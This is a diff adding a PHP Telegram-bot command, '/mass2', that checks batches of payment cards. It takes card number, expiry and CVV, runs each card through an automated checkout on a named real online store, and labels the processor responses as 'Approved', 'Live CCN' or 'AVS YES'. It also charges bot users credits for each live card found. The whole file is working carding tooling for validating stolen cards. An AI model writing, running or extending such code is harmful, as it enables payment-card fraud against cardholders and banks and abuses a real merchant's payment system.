@@ -1,0 +1,152 @@
+<?php
+list($cmd) = explode(" ", $message);
+if($cmd == "/mass2" or $cmd == ".mass2" or $cmd == "!mass2"){  
+$tiempo_inicial = microtime(true);
+    deleteprm($userId);
+    is_credits();
+    deltecred($userId);
+    is_gateroff('mass2');
+    unlink(getcwd().'/cookie.txt');
+    $Mi_Id = "5168647868";
+        $targetas = substr($message, 7);
+    if (empty($targetas)){
+        reply_to($chatId, $message_id,$keyboard,'<b>Mass Charged $1 Format: cc|m|y|cvv</b>');
+        die();
+    }
+    $bin = substr($targetas, 0,6);
+    $bines = bannedbin($bin);
+        if($bines == true){
+            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
+            exit();
+        }
+
+
+$antispmatim = antispamCheck($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+$antispmatim = antispamCheckperemium($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+#Rango 
+$nui = infouser($userId);
+    $Rank = $nui['apodo'];
+if($gId == $Mi_Id){
+    $Rank = "Owner";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == verifiAdmin($userId)){
+    $Rank ="Admin";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == veritimepremium($userId)){
+   $Rank = $nui['apodo'];
+}elseif($chatId == verifiCharAdmin($chatId)){
+    $Rank = "Free User";
+    $GLOBALS['Rank'] = $Rank;
+}
+elseif($userId == verificadroCrdediuser($userId)){
+    $Rank ="Free user";
+    $GLOBALS['Rank'] =$Rank;
+}
+
+#fin 
+
+
+    $m1 = bot("sendmessage", [
+        "chat_id" => $chatId,
+        "text" => "<b>Wait for Result...</b>",
+        "parse_mode" => "html",
+        "reply_to_message_id" => $message_id,
+    ]);
+
+    $ms1 = capture(json_encode($m1), '"message_id":', ",");
+
+    $targetas = cleansix($targetas);
+    $allcards = multiexplode(["\n", " "], $targetas);
+    //aki comienza el limite de ccs a checkar
+if (count($allcards) <= 6) {
+    $resultados = "";
+    $num = 0;
+    foreach ($allcards as $card) {
+        $num = ++$num;
+        $resultados .= "<b>Card: <code>$card</code> \n" . cds2($card) . "</b>\n";
+    }
+
+    // Hacer una sola llamada a la API de Telegram para actualizar el mensaje
+    $tiempo_final = microtime(true);
+    $tiempo = $tiempo_final - $tiempo_inicial;
+    $tiempo = substr($tiempo, 0, 4);
+    $resultados .= "<b>－－－－－－－－－－－－－－－－
+Proxy  - 🝂 Live! ✅ 
+Time in Progress - 🝂 $tiempo s
+Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
+Bot by  - 🝂 Thkss
+－－－－－－－－－－－－－－－</b>";
+
+    // Actualizar el mensaje
+    bot("editMessageText", [
+        "chat_id" => $chatId,
+        "text" => $resultados,
+        "parse_mode" => "html",
+        "message_id" => $ms1,
+    ]);
+}
+ else {
+        bot("editMessageText", [
+            "chat_id" => $chatId,
+            "text" => "Error Maximo",
+            "parse_mode" => "html",
+            "message_id" => $ms1,
+        ]);
+    }
+}
+
+function cds2($lista)
+{
+    global $userId; 
+    $separa = explode("|", $lista);
+    $ccs = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
+    $mes = $separa[1];
+    $ano = $separa[2];
+    $cvv = $separa[3];
+    $cc = clean($ccs);
+
+$result2 = AutoSfCurlx('https://www.lammles.com/products/off-the-grid-otg-nylon-belt?variant=40927679610928',"$lista");
+if ($result2 == "Security code was not matched by the processor"){
+$status = "Approved! CNN 🟩";
+$response = "Your card's security code is incorrect. 🟩";
+restarCredito($userId);
+}elseif ($result2 == 'Street address and postal code do not match.'){ 
+$status = "Approved AVS!🟩";
+$response = "AVS YES!🟩";
+restarCredito($userId);
+}elseif(strpos($result2, 'Your account is almost ready!')){ 
+$status = "Approved!🟩";
+$response = "Your account is almost ready!🟩";
+restarCredito($userId);
+}elseif ($result2 ==  'No Match'){ 
+$status = "Live CCN! 🟩";
+$response = 'The security code is incorrect.🟩';
+restarCredito($userId);
+}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "3D Card.❌";
+}elseif (strpos($result2, "Insufficient funds in the account")){ 
+$status = "Approved!🟩";
+$response = "Insufficient funds in the account";
+}elseif (strpos($result2, "do_not_honor")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "do_not_honor";
+}elseif (strpos($result2, "invalid_account")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "invalid_account";
+}else{
+$status = "[ DECLINED 🔴 ]";
+$response = "$result2";
+   }
+
+    return "Status - 🝂 $status
+Response - 🝂 $response";
+}
